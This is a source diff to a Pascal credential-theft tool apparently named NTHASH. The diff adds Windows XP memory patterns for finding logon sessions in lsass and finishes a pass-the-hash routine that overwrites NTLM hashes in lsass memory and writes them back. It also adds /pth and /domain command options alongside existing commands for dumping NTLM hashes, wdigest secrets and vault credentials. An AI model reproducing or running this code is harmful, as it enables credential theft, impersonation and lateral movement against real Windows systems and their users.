@@ -274,7 +274,7 @@ type i_logsesslist=record
 var
   lsass_pid:dword=0;
   p:dword;
-  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,input:string;
+  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
@@ -544,7 +544,8 @@ const
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
 //x86
-  PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
+PTRN_WN51_LogonSessionList_x86:array [0..6] of byte= ($ff, $50, $10, $85, $c0, $0f, $84);
+PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
@@ -613,13 +614,19 @@ begin
         end;
      end;
   if (lowercase(osarch)='x86') then
-     begin
-          if copy(winver,1,3)='6.1' then
-          begin
-          setlength(pattern,sizeof(PTRN_WNO8_LogonSessionList_x86));
-          copymemory(@pattern[0],@PTRN_WNO8_LogonSessionList_x86[0],sizeof(PTRN_WNO8_LogonSessionList_x86));
-          patch_pos:=-11;
-          end;
+        begin
+        if copy(winver,1,3)='5.1' then //xp
+        begin
+        setlength(pattern,sizeof(PTRN_WN51_LogonSessionList_x86));
+        copymemory(@pattern[0],@PTRN_WN51_LogonSessionList_x86[0],sizeof(PTRN_WN51_LogonSessionList_x86));
+        patch_pos:=24;
+        end;
+        if (copy(winver,1,3)='6.0') or (copy(winver,1,3)='6.1') then //vista and win7
+        begin
+        setlength(pattern,sizeof(PTRN_WNO8_LogonSessionList_x86));
+        copymemory(@pattern[0],@PTRN_WNO8_LogonSessionList_x86[0],sizeof(PTRN_WNO8_LogonSessionList_x86));
+        patch_pos:=-11;
+        end;
      end;
 
   if patch_pos =0 then
@@ -805,12 +812,14 @@ begin
                                                           log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
-                                                          //below is only a test to see if we can re encrypt for PTH
+                                                          //PTH time ! lets modify the crendential buffer and write it back to mem
                                                           if (luid<>0) and (hash<>'') then
                                                           begin
                                                           PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                                           encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
-                                                          writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
+                                                          if writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length)
+                                                             then log('PTH OK',1)
+                                                             else log('PTH NOT OK',1);
                                                           end;//if luid<>0 then
                                                           end;
                                                        if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
@@ -1138,7 +1147,7 @@ begin
      if OpenProcesstoken(pi.hProcess ,TOKEN_READ,token)= true
         then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
            then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
-     writeln(pi.dwProcessId );
+     writeln('PID:'+inttostr(pi.dwProcessId) );
     if stats.AuthenticationId<>0 then
     begin
     //cycle thru logonsessions to match the luid
@@ -1185,6 +1194,7 @@ begin
   log('NTHASH /getlsakeys',1);
   log('NTHASH /wdigest',1);
   log('NTHASH /logonpasswords',1);
+  log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1);
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1);
   log('NTHASH /enumvault',1);
@@ -1197,7 +1207,7 @@ begin
   log('NTHASH /enumproc',1);
   log('NTHASH /killproc /pid:12345',1);
   log('NTHASH /enummod /pid:12345',1);
-  log('NTHASH /dumpprocess /pid:12345',1);
+  log('NTHASH /dumpproc /pid:12345',1);
   log('NTHASH /a_command /verbose',1);
   log('NTHASH /a_command /system',1);
   end;
@@ -1234,11 +1244,7 @@ begin
   }
   //exit;
   //
-  p:=pos('/pth',cmdline);
-  if p>0 then
-   begin
-   pth('admin','','.');
-   end;
+
   p:=pos('/enumcred2',cmdline);
   if p>0 then
    begin
@@ -1404,7 +1410,7 @@ begin
        _EnumMod(strtoint(pid),'');
        exit;
        end;
-  p:=pos('/dumpprocess',cmdline);
+  p:=pos('/dumpproc',cmdline);
   if p>0 then
      begin
      if pid='' then exit;
@@ -1448,6 +1454,14 @@ begin
            delete(user,pos(' ',password),255);
            //log(user);
            end;
+      p:=pos('/domain:',cmdline);
+        if p>0 then
+             begin
+             domain:=copy(cmdline,p,255);
+             domain:=stringreplace(domain,'/domain:','',[rfReplaceAll, rfIgnoreCase]);
+             delete(domain,pos(' ',domain),255);
+             //log(domain);
+             end;
     p:=pos('/gethash',cmdline);
       if p>0 then
            begin
@@ -1576,6 +1590,10 @@ begin
          then log('CryptUnProtectData_ NOT OK',1)
          else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
      end;
-
+  p:=pos('/pth',cmdline);
+  if p>0 then
+   begin
+   pth(user,password,domain);
+   end;
 end.
 
